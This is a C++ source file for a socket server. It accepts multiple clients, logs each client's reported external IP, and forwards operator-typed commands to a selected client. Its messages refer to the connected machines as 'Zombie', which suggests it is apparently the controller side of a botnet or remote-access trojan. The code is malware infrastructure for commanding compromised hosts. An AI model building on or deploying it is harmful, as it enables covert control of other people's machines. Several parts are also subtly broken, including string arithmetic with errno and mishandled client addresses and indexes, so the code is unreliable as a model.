#include "Server.h"

Server::Server(const int pPort) : port(pPort), Socket_()
{
	this->setSock(socket(AF_INET, SOCK_STREAM, IPPROTO_TCP));
	sockaddr_in addr;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	
	if (*(this->getSock()) == INVALID_SOCKET)
	{
#ifdef _WIN32
		std::cout << "Erreur initialisation socket : " << WSAGetLastError();
#else
		print_error("Error initialisation socket : " + errno);
#endif
		this->setError(1);
	}
	
	int res = bind(*this->getSock(), (sockaddr*)&addr, sizeof(addr));
	if (res != 0)
	{
#ifdef _WIN32
		std::cout << "Error bind : " << WSAGetLastError();
#else
		print_error("Error bind : " + errno);
#endif
		this->setError(1);
	}
	res = listen(*this->getSock(), SOMAXCONN);
	if (res != 0)
	{
#ifdef _WIN32
		std::cout << "Error listen : " << WSAGetLastError();
#else
		print_status("Error listen : " + errno);
#endif
		this->setError(1);
	}
	print_status("Server started on : " + std::to_string(port));
}
Server::~Server() 
{
	for (int i = 0; i < clients.size(); i++)
	{
		closesocket(clients[i].sock);
	}
}

void Server::send_c()
{
	char b[256] = { 0 };
	std::cin.getline(b, sizeof(b));	
	Factory_Server fac(this,b);
}
bool Server::send_b(const char* pbuffer)
{
	int ret = send(default_client.sock, pbuffer, SIZE_BUFFER, 0);
	if(ret == 0 || ret == SOCKET_ERROR)
		return 1;
	else
		return 0;
}
bool Server::send_b(const int &pbuffer)
{
	std::string s = std::to_string(pbuffer);
	int ret = send(default_client.sock, s.c_str(), SIZE_BUFFER, 0);
	if (ret == 0 || ret == SOCKET_ERROR)
		return 1;
	else return 0;
}

bool Server::acceptClient()
{
	st_Client NewClient;
	sockaddr_in addr;
	addr.sin_addr.s_addr = INADDR_ANY; // indique que toutes les sources seront acceptées
	addr.sin_port = htons(port); // toujours penser à traduire le port en réseau
	addr.sin_family = AF_INET;
	sockaddr_in from = { 0 };
	socklen_t addrlen = sizeof(addr);
	SOCKET newClient = accept(*this->getSock(), (SOCKADDR*)(&from), &addrlen);

	if (newClient != INVALID_SOCKET)
	{
		char buffer[256];
		char buff[INET6_ADDRSTRLEN] = { 0 };
		std::string clientAddress = inet_ntop(addr.sin_family, (void*)&(addr.sin_addr), buff, INET6_ADDRSTRLEN);
		NewClient.sock = newClient;
		NewClient.addr = clientAddress;
		NewClient.number = (clients.size()+1);
		// IP
		recv(newClient, buffer, sizeof(buffer), 0);

		NewClient.ip_extern = buffer;
		clients.push_back(NewClient);
		print_done("New client accepted : " + NewClient.ip_extern + "/" + std::to_string(addr.sin_port));

		if (clients.size() == 1) 
		{
			default_client = NewClient;
		}
		return 1;
		
	}
	else
	{
		//std::cout << "Error .." << std::endl;
		return 0;
	}
}

std::vector<st_Client> Server::getClients(){return clients;}
bool Server::getExit() { return exit_; }
void Server::setExit(const bool &pexit) { exit_ = pexit; }
void Server::shutdown()
{
	print_status("Closing the server ..");
	for (int i = 0; i < clients.size(); i++)
	{
		send(clients[i].sock, "exit", 5, 0);
	}
	delete this;
	exit(1);
}
void Server::setDefaultClient(st_Client _default)
{
	default_client = _default;
}
st_Client Server::getDefaultClient() const { return default_client; }

bool Server::recv_b()
{
	char b[SIZE_BUFFER] = { 0 };
	if ((recv(*this->getSock(), b, sizeof(b), 0) >= 0))
	{
		this->setBuffer(b);
		std::this_thread::sleep_for(std::chrono::milliseconds(300));
		return 1;
	}
	else
		return 0;
}

void Server::removeDefaultClient()
{
	clients.erase(clients.begin() + default_client.number);
	if (clients.size() != 1)
	{
		for (int i = 0; i < clients.size(); i++)
		{
			clients[i].number = clients[i].number - 1;
		}
	}
}
void Server::removeClient(const unsigned short& nb)
{
	if (clients.size() == 1)
	{
		print_error("0 Zombie are connected");
		this->shutdown();
	}
	else
	{
		print_warning("Removing Zombie " + std::to_string(nb) + " : " + clients[nb].ip_extern);
		clients.erase(clients.begin() + nb);
		print_done("Done");
	}
}